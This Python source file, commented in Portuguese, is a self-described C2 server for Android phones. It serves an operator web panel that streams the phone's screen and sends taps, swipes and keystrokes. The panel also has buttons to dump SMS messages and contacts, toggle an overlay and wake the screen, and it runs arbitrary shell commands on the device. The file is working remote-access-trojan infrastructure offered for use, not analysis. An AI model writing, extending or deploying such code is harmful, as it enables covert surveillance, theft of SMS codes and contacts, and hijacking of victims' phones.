# server.py - C2 local em porta unica: painel em / , celular em /ws , viewer em /panel
import asyncio, base64, json
from aiohttp import web, WSMsgType

PHONES = set()
VIEWERS = set()
INFO = {}

PAGE = r"""<!doctype html><html><head><meta charset="utf-8"><title>aval</title>
<style>
body{margin:0;background:#111;color:#ddd;font:13px system-ui;display:flex;height:100vh}
#left{flex:1;display:flex;flex-direction:column;min-width:0}
#bar{padding:6px;display:flex;gap:4px;flex-wrap:wrap;background:#1b1b1b}
button{background:#2b2b2b;color:#ddd;border:1px solid #444;padding:4px 8px;cursor:pointer}
button:hover{background:#3a3a3a}
#img{flex:1;object-fit:contain;background:#000;min-height:0;cursor:crosshair}
#st{padding:3px 6px;font:11px monospace;color:#f66;min-height:14px}
#right{width:320px;display:flex;flex-direction:column;border-left:1px solid #333}
#log{flex:1;overflow:auto;padding:6px;font:11px monospace;white-space:pre-wrap;word-break:break-all}
#row{padding:6px;display:flex;gap:4px;align-items:center}
input[type=text]{flex:1;background:#222;color:#ddd;border:1px solid #444;padding:5px}
</style></head><body>
<div id="left">
<div id="bar">
<button onclick="k(4)">Voltar</button><button onclick="k(3)">Home</button><button onclick="k(187)">Recentes</button>
<button onclick="cmd('shot',{on:true})">Print ON</button><button onclick="cmd('shot',{on:false})">Print OFF</button>
<button onclick="cmd('ov',{on:true})">Overlay ON</button><button onclick="cmd('ov',{on:false})">Overlay OFF</button>
<button onclick="cmd('screen',{on:true})">Acordar</button>
<button onclick="cmd('sms',{})">SMS</button><button onclick="cmd('contacts',{})">Contatos</button>
</div>
<img id="img">
<div id="st"></div>
<div id="row"><input id="txt" type="text" placeholder="texto, ou $comando para shell"><button onclick="send()">Enviar</button></div>
</div>
<div id="right">
<div id="row">Qualidade<input id="q" type="range" min="15" max="90" value="38" oninput="cmd('q',{v:+this.value})"></div>
<div id="row">FPS<input id="f" type="range" min="1" max="15" value="8" oninput="cmd('fps',{v:+this.value})"></div>
<div id="log"></div>
</div>
<script>
let ws,info={w:0,h:0},lastF=0;
const img=document.getElementById('img'),log=document.getElementById('log'),st=document.getElementById('st');
function add(s){log.textContent+=s+"\n";log.scrollTop=log.scrollHeight}
function connect(){
const p=location.protocol==='https:'?'wss:':'ws:';
ws=new WebSocket(p+'//'+location.host+'/panel');
ws.onopen=()=>add('[painel conectado]');
ws.onclose=()=>{add('[desconectado]');setTimeout(connect,2000)};
ws.onmessage=e=>{const m=JSON.parse(e.data);
  if(m.k==='frame'){lastF=Date.now();st.textContent='';img.src='data:image/jpeg;base64,'+m.d}
  else if(m.k==='log'){const d=m.d;
   if(d.t==='hello'){info=d;add('['+d.id+'] '+d.m+' sdk'+d.sdk+' '+d.w+'x'+d.h+' bat'+d.bat)}
   else add(d.t+': '+(d.o||''))}};
}
setInterval(()=>{if(!lastF||Date.now()-lastF>2500)st.textContent='sem frames do celular'},1000);
function cmd(c,x){if(ws&&ws.readyState===1)ws.send(JSON.stringify(Object.assign({c},x)))}
function k(code){cmd('key',{code})}
function send(){const t=document.getElementById('txt'),v=t.value.trim();if(!v)return;
v[0]==='$'?cmd('shell',{cmd:v.slice(1)}):cmd('text',{s:v});t.value=''}
document.getElementById('txt').addEventListener('keydown',e=>{if(e.key==='Enter')send()});
function pt(ev){const r=img.getBoundingClientRect();
const sx=info.w&&img.naturalWidth?info.w/img.naturalWidth:1;
const sy=info.h&&img.naturalHeight?info.h/img.naturalHeight:1;
return{x:Math.round((ev.clientX-r.left)*(img.naturalWidth/r.width)*sx),
        y:Math.round((ev.clientY-r.top)*(img.naturalHeight/r.height)*sy)}}
let down=null;
img.addEventListener('mousedown',e=>{down=pt(e)});
img.addEventListener('mouseup',e=>{const u=pt(e);if(!down)return;
Math.abs(u.x-down.x)<12&&Math.abs(u.y-down.y)<12
  ?cmd('touch',{x:u.x,y:u.y})
  :cmd('swipe',{x1:down.x,y1:down.y,x2:u.x,y2:u.y,ms:260});down=null});
connect();
</script></body></html>"""


async def _s(ws, d):
    try:
        await ws.send_str(d)
    except Exception:
        pass


async def push(o):
    if not VIEWERS:
        return
    d = json.dumps(o)
    await asyncio.gather(*[_s(v, d) for v in list(VIEWERS)])


async def push_log(o):
    await push({"k": "log", "d": o})


async def index(req):
    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")


async def phone(req):
    # GET simples em /ws devolve a URL ws a usar (bootstrap do apk)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        host = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text=("wss://" if tls else "ws://") + host + "/ws\n")

    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0)
    await ws.prepare(req)
    PHONES.add(ws)
    print("+ celular conectado")
    await push_log({"t": "info", "o": "celular conectado"})
    async for m in ws:
        if m.type == WSMsgType.BINARY:
            await push({"k": "frame", "d": base64.b64encode(m.data).decode()})
        elif m.type == WSMsgType.TEXT:
            try:
                o = json.loads(m.data)
            except Exception:
                o = {"t": "raw", "o": m.data}
            if o.get("t") == "hello":
                INFO.update(o)
            await push_log(o)
    PHONES.discard(ws)
    print("- celular desconectado")
    await push_log({"t": "info", "o": "celular desconectado"})
    return ws


async def panel(req):
    ws = web.WebSocketResponse(heartbeat=20)
    await ws.prepare(req)
    VIEWERS.add(ws)
    if INFO:
        await _s(ws, json.dumps({"k": "log", "d": INFO}))
    async for m in ws:
        if m.type != WSMsgType.TEXT:
            continue
        for p in list(PHONES):
            try:
                await p.send_str(m.data)
            except Exception:
                pass
    VIEWERS.discard(ws)
    return ws


def main():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", lambda r: web.Response(text="ok"))
    print("painel -> http://localhost:8080/")
    web.run_app(app, host="0.0.0.0", port=8080, print=None)


main()